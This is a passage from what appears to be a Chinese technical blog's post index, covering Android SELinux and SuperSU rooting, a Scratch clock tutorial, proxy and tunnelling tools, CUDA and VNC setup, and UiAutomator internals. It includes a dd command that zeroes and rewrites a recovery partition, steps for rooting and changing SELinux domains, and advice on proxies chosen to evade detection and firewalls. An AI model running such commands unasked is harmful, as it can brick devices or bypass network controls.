<p>另外，以u:r:init:s0创建的进程，创建的localsocket服务端，在PC无法用adb forward命令转发到PC上，怀疑是adbd进程无法访问u:r:init:s0域的原因，使用runcon命令将进程以u:r:shell:s0域创建，locaclsocket可以转发到PC，但是权限可能会降低。  </p>
<blockquote>
<p>runcon u:r:shell:s0 sh</p>
</blockquote>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>inject</tag>
      </tags>
  </entry>
  <entry>
    <title>Scratch教程---开发一个时钟</title>
    <url>/2024/03/06/scratch-clock/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文介绍了如何使用Scratch开发一款实时的时钟程序，通过这个例子，可以让学员加深对时钟运行规律的理解，同时学习到死循环、事件驱动等编程相关的知识点。</p>
<h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><p>需要提前准备好时钟的资源文件：</p>
<ul>
<li>表盘: <img src="/images/clock.png" width="50%" alt="表盘"></li>
<li>时针: <img src="/images/hour-hand.png" style="height: 100px;" alt="时针"></li>
<li>分针: <img src="/images/minute-hand.png" style="height: 100px;" alt="分针"></li>
<li>秒针: <img src="/images/second-hand.png" style="height: 100px;" alt="秒针"></li>
</ul>
<p>将资源文件保存到本地。</p>
<p>使用浏览器打开Scratch的国内镜像站：<code>https://scratch.drunkdream.cn/</code>。</p>
<h2 id="0x02-添加背景和角色"><a href="#0x02-添加背景和角色" class="headerlink" title="0x02 添加背景和角色"></a>0x02 添加背景和角色</h2><ol>
<li>删除默认角色</li>
<li>上传表盘图片作为程序背景</li>
<li>分别上传时针、分针和秒针图片，创建出三个角色</li>
</ol>
<p>操作完如下图所示：</p>
<p><img src="/images/scratch-clock-1.png" width="50%"></p>
<ol start="4">
<li>调整时针、分针和秒针的转动支点</li>
</ol>
<p>由于每个角色默认的转动支点是中点，但实际上指针的转动支点是在靠近尾部的位置。可以将角色切换到<code>造型</code>页面，按<code>Ctrl + C</code>全选角色，并按照下图所示拖动角色，使得旋转支点移动到时针尾部位置。</p>
<p><img src="/images/scratch-clock-2.png" width="10%"></p>
<p>使用同样方法移动分针和秒针的支点。</p>
<ol start="5">
<li>时针、分针和秒针设置合适的比例，并移动到表盘的合适位置，使得旋转支点位于表盘中点</li>
</ol>
<p>设置完如下图所示：</p>
<p><img src="/images/scratch-clock-3.png" width="50%"></p>
<h2 id="0x03-添加指针转动逻辑"><a href="#0x03-添加指针转动逻辑" class="headerlink" title="0x03 添加指针转动逻辑"></a>0x03 添加指针转动逻辑</h2><p>秒针是每秒转动一格，一圈是60格，因此秒针每秒转动<code>360 / 60 = 6</code>度。这可以通过<code>死循环 + 右转6度 + 等待1秒</code>三个组件来实现。</p>
<p>为秒针角色添加如下代码：</p>
<p><img src="/images/scratch-clock-4.png" width="30%"></p>
<p>分针每小时转动一圈，因此每秒转动<code>360 / 3600 = 0.1</code>度。</p>
<p>为分针角色添加如下代码：</p>
<p><img src="/images/scratch-clock-5.png" width="30%"></p>
<p>时针每12小时转动一圈，因此每12秒转动0.1度。</p>
<p>为时针角色添加如下代码：</p>
<p><img src="/images/scratch-clock-6.png" width="30%"></p>
<p>至此，一个最简单的时钟就完成了，各针的转动速度都是符合预期的。</p>
<h2 id="0x04-实现时钟同步"><a href="#0x04-实现时钟同步" class="headerlink" title="0x04 实现时钟同步"></a>0x04 实现时钟同步</h2><p>目前时钟时间没有与真实时间同步，需要添加一个同步逻辑。</p>
<p>Scratch支持获取当前时间的时、分、秒，只要才程序开始的时候获取到对应的值，并转动到指定位置即可。</p>
<p>先将时针、分针和秒针转动到0点位置，然后秒针转动<code>秒针数 x 6</code>度；分针转动<code>分针数 x 6</code>度；时针先转动<code>小时数 x 30</code>度（360 / 12），然后再转动<code>分针数 x 0.5</code>度（360 / 12 / 60）。</p>
<p>完整的代码如下：</p>
<ul>
<li>时针</li>
</ul>
<p><img src="/images/scratch-clock-7.png" width="60%"></p>
<ul>
<li>分针</li>
</ul>
<p><img src="/images/scratch-clock-8.png" width="40%"></p>
<ul>
<li>秒针</li>
</ul>
<p><img src="/images/scratch-clock-9.png" width="40%"></p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>这个例子的代码整体不算很复杂，主要是需要了解时针、分针和秒针的运行规律，并转换为对应的计算公式。</p>
<p>完整的代码可以在<a href="/images/clock.sb3">这里</a>下载。</p>
]]></content>
      <categories>
        <category>Scratch</category>
      </categories>
      <tags>
        <tag>clock</tag>
      </tags>
  </entry>
  <entry>
    <title>TOS中安装 SuperSU</title>
    <url>/2017/01/07/tos-supersu/</url>
    <content><![CDATA[<p>TOS中安装第三方recovery后，刷入SuperSU刷机包，重启后发现无法获取su权限，原因是daemonsu进程没有运行。<br>解决方法是将/system/etc/install-qrom-recovery.sh文件替换成/system/etc/install-recovery.sh，这样，重启手机后才会创建daemonsu进程。同时，还需要删除/system/vendor/bin/su，因为会优先使用这个su。<br>另外，贴一下TOS中每次自动刷recovery的脚本。  </p>
<pre><code>#!/system/bin/sh  
if ! applypatch -c EMMC:/dev/block/platform/msm_sdcc.1/by-name/recovery:12238848
:ff0553f96edc2bffa97e4ee722422a04f2b66504; then  
  log -t recovery &quot;Installing new recovery image&quot;  
  # At most 32M, It is enough currently  
  dd if=/dev/zero of=/dev/block/platform/msm_sdcc.1/by-name/recovery bs=4096 cou
nt=8192  
  dd if=/system/etc/recovery.img of=/dev/block/platform/msm_sdcc.1/by-name/recov
ery || log -t recovery &quot;Dump into /dev/block/platform/msm_sdcc.1/by-name/recover
y error!&quot;  
else  
  log -t recovery &quot;Recovery image already installed&quot;  
fi
</code></pre>]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>tos</tag>
      </tags>
  </entry>
  <entry>
    <title>远程访问统一管理工具——turbo-tunnel</title>
    <url>/2021/02/27/turbo-tunnel/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>你是否遇到过以下这些情况：</p>
<ul>
<li><p>目标服务需要通过跳板机才能访问，每次都要将端口映射到本地，然后配置<code>hosts</code>访问</p>
</li>
<li><p>不同的服务需要配置不同的代理才能访问，管理起来很不方便</p>
</li>
<li><p>有些服务需要通过嵌套代理才能访问，本地不太好配置</p>
</li>
<li><p>本地开发、调试后端服务时，对于第三方依赖服务难以直连或通过同一个代理访问，而服务进程又只能配置固定的代理</p>
</li>
<li><p>使用全局透明代理时，无法根据目标服务选择不同的路由代理</p>
</li>
</ul>
<p>总的来说，就是因为各种网络连通限制导致的跨网络访问（如：开发、运维环境差异，或是需要连通不同局域网），会影响到我们日常的开发、调试工作，而<a href="https://github.com/drunkdream/turbo-tunnel" target="_blank" rel="noopener">turbo-tunnel</a>就是为了解决这一问题而诞生的。</p>
<p>它的总体思想是将不同的代理、隧道都转换成本地一个统一的代理服务（如：HTTPS代理、socks5代理），然后进程在访问目标网络时通过配置环境变量或透明代理方式，达到自由访问目标网络的目的；而<code>turbo-tunnel</code>提供了多种不同代理/隧道的支持，并且可以通过插件方式支持更多类型的隧道。</p>
<h2 id="0x01-常见的跨网络访问方式"><a href="#0x01-常见的跨网络访问方式" class="headerlink" title="0x01 常见的跨网络访问方式"></a>0x01 常见的跨网络访问方式</h2><h3 id="标准代理"><a href="#标准代理" class="headerlink" title="标准代理"></a>标准代理</h3><p>标准代理是指较为通用的代理类型，其代理协议格式一般是有专门的RFC编号的。</p>
<p>HTTPS代理是最常见的一种标准代理类型，大多在内网中作为统一的网络出口提供。浏览器等应用可以直接用它来访问https的网站，但一般也可以用于访问其它任意类型的TCP服务，如：FTP、SSH、VNC等。</p>
<p>其它常见的标准代理协议还有<code>Socks4</code>、<code>Socks5</code>等，但使用上不及HTTPS广泛。</p>
<h3 id="非标准代理"><a href="#非标准代理" class="headerlink" title="非标准代理"></a>非标准代理</h3><p>某些场景下需要考虑代理服务的隐蔽性和稳定性，此时可以考虑使用非标准版代理。这些代理一般是应用自己定义的格式，其他人很难使用探测的方式发现这是个代理服务。</p>
<p>Websocket代理就是一种很优秀的非标准代理协议，不同应用一般都有自己不同的实现。选择WebSocket协议的原因是：它是一种类似于TCP的流式协议，可以做到全双工通信；它本身基于HTTP协议，易于扩展，Web服务器（如：Nginx）支持性也较好，并且容易穿透防火墙；与HTTPS结合后还能极大提升安全性。由此可见，在诸多协议中，WebSocket协议是最佳的非标准代理选择。</p>
<p>WebSocket协议的握手阶段也可以轻松实现鉴权、建立通信隧道等逻辑；可以说，用它实现非标准代理协议成本是相当低的。</p>
<p>当然，其它协议也可以用于实现非标准代理，只是实现成本与代理效果的问题。</p>
<h3 id="通信隧道"><a href="#通信隧道" class="headerlink" title="通信隧道"></a>通信隧道</h3><p>通信隧道是指将真正要通信的数据加密处理后包装成通用的数据包格式在公网中传输，以达到保护通信数据的目的。常见的通信隧道有：<code>VPN</code>、<code>IPv6隧道</code>、<code>SSH隧道</code>等。</p>
<p>其中，SSH隧道由于十分常见，无需额外部署服务，同时具有较高的隐蔽性和便利性。很多场景下SSH服务会以<code>跳板机</code>的形式提供，使得它成为唯一能够穿透网络的途径。一般情况下是借助于SSH服务的端口转发能力建立通信隧道；但如果SSH服务没有开启端口转发，就只能使用其它手段建立通信隧道了（例如使用进程的stdin和stdout代替socket）。</p>
<h2 id="0x02-嵌套访问"><a href="#0x02-嵌套访问" class="headerlink" title="0x02 嵌套访问"></a>0x02 嵌套访问</h2><p>嵌套访问是一种很常见的使用场景，例如：在公司内需要先通过HTTPS访问外网，然后再通过公网的一台SSH跳板机来访问真正的目标服务，甚至有可能还要多次穿越SSH隧道。在不借助特定工具的情况下，这种场景一般比较难以支持，就算能够支持也比较复杂。</p>
<p>支持嵌套访问的原理是：建立每一层的代理连接后，都会告诉它下一跳代理的地址，这样会建立一个请求链，最终将请求发送到真正的目标服务。</p>
<p>turbo-tunnel目前支持将<code>HTTPS</code>、<code>SSH</code>、<code>Websocket</code>、<code>SOCKS4</code>等代理或隧道，进行任意层级或顺序的组合，从而达到支持嵌套访问的目的。</p>
<h2 id="0x03-支持配置文件"><a href="#0x03-支持配置文件" class="headerlink" title="0x03 支持配置文件"></a>0x03 支持配置文件</h2><p>将配置存储到文件，可以避免因进程退出或系统重启导致的配置丢失问题，而且在配置内容较多时，可以有效地管理这些配置，避免混乱。如果需要将配置迁移到另一台机器，也只需要将配置文件拷贝到另一台机器即可。</p>
<p>turbo-tunnel使用<code>yaml</code>格式来管理配置，具体使用方式可以<a href="https://ttun.top/config.html" target="_blank" rel="noopener">参考文档</a>。</p>
<h2 id="0x04-路由管理"><a href="#0x04-路由管理" class="headerlink" title="0x04 路由管理"></a>0x04 路由管理</h2><p>在多个代理并存的情况下，必然会出现不同目标服务使用不同代理的需求。这种情况就需要进行路由的管理，这和<code>Proxifier</code>中的规则配置是一致的。</p>
<p>turbo-tunnel通过在配置文件中配置路由规则，允许用户根据目标服务的域名、IP、端口等信息进行路由管理，并且可以设置规则的优先级。</p>
<h2 id="0x05-使用本地的统一代理"><a href="#0x05-使用本地的统一代理" class="headerlink" title="0x05 使用本地的统一代理"></a>0x05 使用本地的统一代理</h2><p>turbo-tunnel可以在本地建立一个统一的代理服务（推荐使用http/https代理），自动将接收到请求进行路由分发。用户可以使用以下一些方式来使用这个代理服务：</p>
<ul>
<li><p>配置<code>http_proxy</code>或<code>https_proxy</code>环境变量，很多命令行工具，如：<code>curl</code>，会读取这个环境变量并通过代理访问。</p>
</li>
<li><p>浏览器可以通过配置代理服务器的地址，来将所有流量导入到本地的代理服务。</p>
</li>
<li><p>Windows和MacOS推荐使用Proxifier，规则可以设大一些，这样能够实现<code>全局透明代理</code>，应用程序不用再单独设置了。</p>
</li>
<li><p>Linux可以使用proxychains等工具进行流量转发，使用时在命令行前面加上<code>proxychains</code>，这样不会影响其它命令，较为灵活。</p>
</li>
</ul>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>turbo-tunnel是一款为简化复杂场景下跨网络访问的工具，提供了多种代理/隧道协议的支持，相信它能为你的工作带来帮助。</p>
<p>详细文档地址：<a href="https://ttun.top/" target="_blank" rel="noopener">https://ttun.top/</a>。</p>
<p>Github项目地址：<a href="https://github.com/drunkdream/turbo-tunnel" target="_blank" rel="noopener">https://github.com/drunkdream/turbo-tunnel</a>。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 16.04安装 cuda 9.2</title>
    <url>/2018/05/17/ubuntu-install-cuda/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前在Ubuntu 16.04上安装了[cuda 9.1]，工作也很正常。但是，后来莫名奇妙就出问题了，重装cuda之后还总是进不了系统。因此，寻找到了以下优化的安装方法。</p>
<h2 id="0x01-安装步骤"><a href="#0x01-安装步骤" class="headerlink" title="0x01 安装步骤"></a>0x01 安装步骤</h2><p>主要优化点：<strong>将之前使用cuda中自带的GPU驱动改为手动安装</strong>。</p>
<p>以下操作都在<code>root</code>权限下执行：</p>
<h3 id="1、-安装GPU驱动"><a href="#1、-安装GPU驱动" class="headerlink" title="1、 安装GPU驱动"></a>1、 安装GPU驱动</h3><p>更新源</p>
<pre><code>add-apt-repository ppa:graphics-drivers/ppa
apt update
</code></pre><p>检查当前最佳驱动版本</p>
<pre><code>root@vm:~# ubuntu-drivers devices
== /sys/devices/pci0000:00/0000:00:01.0/0000:01:00.0 ==
modalias : pci:v000010DEd000011C0sv00001458sd0000354Ebc03sc00i00
vendor   : NVIDIA Corporation
model    : GK106 [GeForce GTX 660]
driver   : nvidia-390 - third-party free
driver   : nvidia-384 - third-party free
driver   : nvidia-396 - third-party free recommended
driver   : xserver-xorg-video-nouveau - distro free builtin
driver   : nvidia-340 - third-party free
driver   : nvidia-304 - third-party free
</code></pre><p>可以看出，目前推荐的驱动版本是<code>nvidia-396</code></p>
<pre><code>apt install nvidia-396
</code></pre><p>几分钟后安装完成，使用<code>nvidia-smi</code>命令测试驱动安装是否成功</p>
<pre><code>root@vm:~# nvidia-smi
Fri May 18 09:18:28 2018       
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 396.24                 Driver Version: 396.24                    |
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|===============================+======================+======================|
|   0  GeForce GTX 660     Off  | 00000000:01:00.0 N/A |                  N/A |
| 57%   57C    P0    N/A /  N/A |   1871MiB /  1994MiB |     N/A      Default |
+-------------------------------+----------------------+----------------------+

+-----------------------------------------------------------------------------+
| Processes:                                                       GPU Memory |
|  GPU       PID   Type   Process name                             Usage      |
|=============================================================================|
|    0                    Not Supported                                       |
+-----------------------------------------------------------------------------+
</code></pre><h3 id="2、安装cuda-9-2"><a href="#2、安装cuda-9-2" class="headerlink" title="2、安装cuda 9.2"></a>2、安装cuda 9.2</h3><p>点击链接<a href="https://developer.nvidia.com/cuda-downloads?target_os=Linux&amp;target_arch=x86_64&amp;target_distro=Ubuntu&amp;target_version=1604&amp;target_type=runfilelocal" target="_blank" rel="noopener">https://developer.nvidia.com/cuda-downloads?target_os=Linux&amp;target_arch=x86_64&amp;target_distro=Ubuntu&amp;target_version=1604&amp;target_type=runfilelocal</a>，下载cuda安装程序到本地。</p>
<p><img src="/images/cuda_download.png" alt></p>
<p>如果本地安装，可以按<code>Ctrl + Alt + F1</code>进入命令行模式；如果是远程访问，可以使用<code>ssh</code>连接过去。</p>
<pre><code>systemctl stop lightdm
</code></pre><p>使用上面的命令关闭桌面服务</p>
<pre><code>chmod 755 cuda_9.2.88_396.26_linux.run
./cuda_9.2.88_396.26_linux.run
</code></pre><p>运行下载下来的安装文件</p>
<pre><code>Install NVIDIA Accelerated Graphics Driver for Linux-x86_64 396.26?
(y)es/(n)o/(q)uit: 
</code></pre><p>除了驱动项选择<code>no</code>，其它使用默认值即可</p>
<h2 id="0x02-后记"><a href="#0x02-后记" class="headerlink" title="0x02 后记"></a>0x02 后记</h2><p>如果下次又出现驱动无法使用，或进不了系统的情况，只要重新安装一下驱动即可，不需要重新安装cuda</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>cuda</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu安装Proxychains</title>
    <url>/2017/02/24/ubuntu-install-proxychains/</url>
    <content><![CDATA[<p>Proxychains是Linux上一款全局代理工具，通过Hook Socket函数实现透明代理，这和Windows上的Proxifier有点类似。<br>在Ubuntu上安装Proxychains的方法是：</p>
<blockquote>
<p>apt-get install proxychains</p>
</blockquote>
<p>安装的是3.1版本，配置文件的路径是：/etc/proxychains.conf，内容如下：</p>
<pre><code># proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
#dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns 

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

# ProxyList format
#       type  host  port [user pass]
#       (values separated by &#39;tab&#39; or &#39;blank&#39;)
#
#
#        Examples:
#
#               socks5  192.168.67.78   1080    lamer   secret
#               http    192.168.89.3    8080    justu   hidden
#               socks4  192.168.1.49    1080
#               http    192.168.39.93   8080
#
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: &quot;basic&quot;-http  &quot;user/pass&quot;-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to &quot;tor&quot;
socks4         127.0.0.1 9050
</code></pre><p>Proxychains支持HTTP（HTTP-Connect）、SOCKS4和SOCKS5三种类型的代理，需要注意的是：配置代理服务器只能使用ip地址，不能使用域名，否则会连不上。</p>
<p>Proxychains支持3种模式：  </p>
<ol>
<li>动态模式<br>按照配置的代理顺序连接，不存活的代理服务器会被跳过  </li>
<li>严格模式<br>按照配置的代理顺序连接，必须保证所有代理服务器都是存活的，否则会连接失败  </li>
<li>随机模式<br>随机选择一台代理服务器连接，也可以使用代理链</li>
</ol>
<p>如果不需要代理DNS的话，可以注释掉proxy_dns这行。</p>
<p>使用的时候在命令行前加上proxychains即可。</p>
<blockquote>
<p>root@ubuntu-pc:~# proxychains telnet <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 80<br>ProxyChains-3.1 (<a href="http://proxychains.sf.net" target="_blank" rel="noopener">http://proxychains.sf.net</a>)<br>Trying 14.215.177.37…<br>|R-chain|-&lt;&gt;-10.0.0.10:8080-&lt;&gt;&lt;&gt;-14.215.177.37:80-&lt;&gt;&lt;&gt;-OK<br>Connected to <a href="http://www.a.shifen.com" target="_blank" rel="noopener">www.a.shifen.com</a>.<br>Escape character is ‘^]’.  </p>
</blockquote>
<p>proxychains命令其实是个脚本文件，内容如下：</p>
<pre><code>#!/bin/sh
echo &quot;ProxyChains-3.1 (http://proxychains.sf.net)&quot;
if [ $# = 0 ] ; then
        echo &quot;  usage:&quot;
        echo &quot;          proxychains &lt;prog&gt; [args]&quot;
        exit
fi
export LD_PRELOAD=libproxychains.so.3
exec &quot;$@&quot;
</code></pre><p>它的目的是设置LD_PRELOAD环境变量，以便创建的新进程会加载libproxychains.so.3，这个so的作用是Hook Socket函数。因此，也可以在当前shell中执行：  </p>
<pre><code>export LD_PRELOAD=libproxychains.so.3
</code></pre><p>这样之后执行的命令都会使用代理访问。</p>
<p>不过这个版本有个问题，配置代理后所有的连接都会走代理，包括对回环地址的访问。这并不是我们所期望的，幸好有个版本提供了解决方案。</p>
<blockquote>
<p>git clone <a href="https://github.com/rofl0r/proxychains" target="_blank" rel="noopener">https://github.com/rofl0r/proxychains</a><br>cd proxychains<br>./configure<br>make<br>make install  </p>
</blockquote>
<p>安装后在配置文件中加入：</p>
<blockquote>
<p>localnet 127.0.0.0/255.0.0.0</p>
</blockquote>
<p>安装后的命令是proxychains4，因此可以和旧版本命令并存。这样对于回环地址就可以绕过代理，使用直连了。</p>
<p>相对于Proxifier而言，这种方式还是弱了一点，毕竟有时候我们还是需要根据不同的情况使用不同的代理服务器。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Proxychains</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu安装VNC Server</title>
    <url>/2017/09/26/ubuntu-install-vnc-server/</url>
    <content><![CDATA[<p>之前在ubuntu上一般都是用vnc4server，但是它只能打开一个窗口，无法像windows上那样操作本地桌面，只能说比ssh强大一点。</p>
<p>今天发现了一个强大的vnc服务端<code>x11vnc</code>，可以远程操作本地桌面。以下内容主要来自于：<a href="http://blog.csdn.net/longhr/article/details/51657610" target="_blank" rel="noopener">http://blog.csdn.net/longhr/article/details/51657610</a>。</p>
<h2 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h2><blockquote>
<p>以下命令都需要在root权限下运行，因此不单独加上sudo。</p>
</blockquote>
<h3 id="1-安装-X11VNC"><a href="#1-安装-X11VNC" class="headerlink" title="1. 安装 X11VNC"></a>1. 安装 X11VNC</h3><pre><code class="bash">apt install x11vnc -y
</code></pre>
<h3 id="2-配置访问密码"><a href="#2-配置访问密码" class="headerlink" title="2. 配置访问密码"></a>2. 配置访问密码</h3><pre><code class="bash">x11vnc -storepasswd /etc/x11vnc.pass 
</code></pre>
<h3 id="3-创建服务"><a href="#3-创建服务" class="headerlink" title="3. 创建服务"></a>3. 创建服务</h3><h4 id="Ubuntu-16-04"><a href="#Ubuntu-16-04" class="headerlink" title="Ubuntu 16.04"></a>Ubuntu 16.04</h4><blockquote>
<p>vi /lib/systemd/system/x11vnc.service</p>
</blockquote>
<p>按i键进入编辑模式，粘贴如下代码，按esc键退出编辑模式，输入 :wq 保存。</p>
<pre><code class="ini">[Unit]  
Description=Start x11vnc at startup.  
After=multi-user.target  
[Service]  
Type=simple  
ExecStart=/usr/bin/x11vnc -auth guess -forever -loop -noxdamage -repeat -rfbauth /etc/x11vnc.pass -rfbport 5900 -shared  
[Install]  
WantedBy=multi-user.target
</code></pre>
<h4 id="Ubuntu-14-04"><a href="#Ubuntu-14-04" class="headerlink" title="Ubuntu 14.04"></a>Ubuntu 14.04</h4><blockquote>
<p>vi /etc/init/x11vnc.conf</p>
</blockquote>
<p>按i键进入编辑模式，粘贴如下代码，按esc键退出编辑模式，输入 :wq 保存。</p>
<pre><code class="conf">start on login-session-start

script

x11vnc -display :0 -auth /var/run/lightdm/root/:0 -forever -bg -o /var/log/x11vnc.log -rfbauth /etc/x11vnc.pass -rfbport 5900

end script
</code></pre>
<h3 id="4-配置防火墙，配置和启动服务"><a href="#4-配置防火墙，配置和启动服务" class="headerlink" title="4. 配置防火墙，配置和启动服务"></a>4. 配置防火墙，配置和启动服务</h3><pre><code class="bash">ufw allow 5900
</code></pre>
<p>下面两行适用于16.04</p>
<pre><code class="bash">systemctl enable x11vnc.service  
systemctl daemon-reload
</code></pre>
<h3 id="5-重启电脑"><a href="#5-重启电脑" class="headerlink" title="5. 重启电脑"></a>5. 重启电脑</h3><pre><code class="bash">reboot
</code></pre>
<p><img src="/images/ubuntu_vnc.png" alt></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>UIAutomator2.0和AccessibilityService实现分析</title>
    <url>/2019/07/19/uiautomator-accessibilityservice/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>UiAutomator是Android 4.1以上提供的一个UI自动化测试工具，4.3升级到了UiAutomator2.0，实现方式也从UiTestAutomationBridge变成了UiAutomation。</p>
<h2 id="0x01-UiAutomation实现分析"><a href="#0x01-UiAutomation实现分析" class="headerlink" title="0x01 UiAutomation实现分析"></a>0x01 UiAutomation实现分析</h2><p>UiAutomation类位于android.app包下面，是API18新增的类。</p>
<pre><code class="java">public final class UiAutomation {
    private final IAccessibilityServiceClient mClient;
    private final IUiAutomationConnection mUiAutomationConnection;

    public void connect();
    public void disconnect();
    public final boolean performGlobalAction(int action);
    public final AccessibilityServiceInfo getServiceInfo();
    public AccessibilityNodeInfo getRootInActiveWindow();
    public boolean injectInputEvent(InputEvent event, boolean sync);
    public boolean setRotation(int rotation);
    public AccessibilityEvent executeAndWaitForEvent(Runnable command, AccessibilityEventFilter filter, long timeoutMillis);
    public void waitForIdle(long idleTimeoutMillis, long globalTimeoutMillis);
    public Bitmap takeScreenshot();
    public void setRunAsMonkey(boolean enable);
｝
</code></pre>
<p>以上是UiAutomation类中最重要的成员变量和函数，所有的接口基本都是通过调用<code>mClient</code>和<code>mUiAutomationConnection</code>这两个对象实现的。</p>
<pre><code class="java">public UiAutomation(Looper looper, IUiAutomationConnection connection) {
    if (looper == null) {
        throw new IllegalArgumentException(&quot;Looper cannot be null!&quot;);
    }
    if (connection == null) {
        throw new IllegalArgumentException(&quot;Connection cannot be null!&quot;);
    }
    mUiAutomationConnection = connection;
    mClient = new IAccessibilityServiceClientImpl(looper);
}

interface IUiAutomationConnection {
    void connect(IAccessibilityServiceClient client);
    void disconnect();
    boolean injectInputEvent(in InputEvent event, boolean sync);
    boolean setRotation(int rotation);
    Bitmap takeScreenshot(int width, int height);
    boolean clearWindowContentFrameStats(int windowId);
    WindowContentFrameStats getWindowContentFrameStats(int windowId);
    void clearWindowAnimationFrameStats();
    WindowAnimationFrameStats getWindowAnimationFrameStats();
    void executeShellCommand(String command, in ParcelFileDescriptor fd);
    void grantRuntimePermission(String packageName, String permission, int userId);    
    void revokeRuntimePermission(String packageName, String permission, int userId);

    // Called from the system process.
    oneway void shutdown();
}
</code></pre>
<p>UiAutomation构造函数需要传入两个参数，一个是线程<code>Looper</code>对象，用于发送消息，一个是<code>IUiAutomationConnection</code>接口实例。</p>
<pre><code class="java">public void connect() {
    if (mHandlerThread.isAlive()) {
        throw new IllegalStateException(&quot;Already connected!&quot;);
    }
    mHandlerThread.start();
    mUiAutomation = new UiAutomation(mHandlerThread.getLooper(),
            new UiAutomationConnection());
    mUiAutomation.connect();
}
</code></pre>
<p>这是<code>UiAutomationShellWrapper</code>类中的一个方法，正好可以看到UiAutomation如何初始化。构造函数的第二个参数实际使用的是UiAutomationConnection类实例，这个类也是在android.app包下面，正是继承自IUiAutomationConnection.Stub类。</p>
<p>UiAutomation中一个重要的成员变量是<code>mClient</code>，它的类型是<code>IAccessibilityServiceClient</code>。</p>
<pre><code class="java">oneway interface IAccessibilityServiceClient {

    void init(in IAccessibilityServiceConnection connection, int connectionId, IBinder windowToken);

    void onAccessibilityEvent(in AccessibilityEvent event);

    void onInterrupt();

    void onGesture(int gesture);

    void clearAccessibilityCache();

    void onKeyEvent(in KeyEvent event, int sequence);
}
</code></pre>
<p>IAccessibilityServiceClient是一个AIDL接口定义，在抽象类AccessibilityService中实现了一个该接口的实现类IAccessibilityServiceClientWrapper。UiAutomation中定义了一个IAccessibilityServiceClientWrapper的子类IAccessibilityServiceClientImpl，主要是重写了onAccessibilityEvent方法，用于获取<code>AccessibilityEvent</code>事件。UiAutomation的构造函数中实例化的正是<code>IAccessibilityServiceClientImpl</code>实例。</p>
<p>UiAutomation的初始化过程主要是在connect方法中。</p>
<pre><code class="java">/**
    * Connects this UiAutomation to the accessibility introspection APIs.
    *
    * @hide
    */
public void connect() {
    synchronized (mLock) {
        throwIfConnectedLocked();
        if (mIsConnecting) {
            return;
        }
        mIsConnecting = true;
    }

    try {
        // Calling out without a lock held.
        mUiAutomationConnection.connect(mClient);
    } catch (RemoteException re) {
        throw new RuntimeException(&quot;Error while connecting UiAutomation&quot;, re);
    }

    synchronized (mLock) {
        final long startTimeMillis = SystemClock.uptimeMillis();
        try {
            while (true) {
                if (isConnectedLocked()) {
                    break;
                }
                final long elapsedTimeMillis = SystemClock.uptimeMillis() - startTimeMillis;
                final long remainingTimeMillis = CONNECT_TIMEOUT_MILLIS - elapsedTimeMillis;
                if (remainingTimeMillis &lt;= 0) {
                    throw new RuntimeException(&quot;Error while connecting UiAutomation&quot;);
                }
                try {
                    mLock.wait(remainingTimeMillis);
                } catch (InterruptedException ie) {
                    /* ignore */
                }
            }
        } finally {
            mIsConnecting = false;
        }
    }
}
</code></pre>
<p>这里主要是调用了mUiAutomationConnection.connect(mClient)。</p>
<pre><code class="java">public void connect(IAccessibilityServiceClient client) {
    if (client == null) {
        throw new IllegalArgumentException(&quot;Client cannot be null!&quot;);
    }
    synchronized (mLock) {
        throwIfShutdownLocked();
        if (isConnectedLocked()) {
            throw new IllegalStateException(&quot;Already connected.&quot;);
        }
        mOwningUid = Binder.getCallingUid();
        registerUiTestAutomationServiceLocked(client);
        storeRotationStateLocked();
    }
}

